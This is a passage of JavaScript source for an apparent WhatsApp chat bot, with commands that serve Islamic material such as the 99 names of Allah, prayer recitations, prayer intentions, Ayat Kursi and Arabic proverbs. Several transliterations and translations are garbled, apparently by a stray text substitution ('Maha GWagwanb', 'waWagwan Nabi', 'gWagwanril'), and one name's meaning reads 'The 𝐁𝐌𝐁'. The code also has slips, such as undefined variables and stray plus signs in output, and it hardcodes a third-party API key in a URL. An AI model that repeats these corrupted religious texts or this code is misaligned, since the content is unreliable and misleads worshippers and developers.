        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha GWagwanb",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The 𝐁𝐌𝐁"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replydare (`Example:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replydare(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    replydare(`${contoh} + ${data} + ${anjuran}`)
}
break
//=========================================\\
case 'audiosurah': {
	let wrong = `_*Usage Example :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return replydare(`${wrong}`)
      reply(mess.wait)
   Dare.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=efcb180d3fd3134748648887` }, mimetype: 'audio/mp4' }, { quoted: m });

}
break
//=========================================\\

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  replydare(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim gWagwanril maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu waWagwan Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau waWagwan Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    replydare(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replydare(`${caption}`)

}
break
//=========================================\\
case 'assalamualaikum': 
case 'assalamualaikum wr. wb.': 
case 'assalamualaikum wr wb': {
    let caption = `*May the peace, mercy, and blessings of Allah be with you too*


_📚 BLook at the one below!_
"The person who says a greeting like this will get 30 rewards, then, the person who is in front of or hears it replies with the same sentence, namely "Wa'alaikum salam warahmatullahi wabarakatuh" or added with something else (waridhwaana). This means apart from the prayer of congratulations also ask Allah SWT"
/`.trim()
    replydare(`${caption}`)
}
break
//=========================================\\
case 'niatsholat': {
    if (!q) return replydare(`Examples of use :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return replydare(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    replydare(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "WaWagwan saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
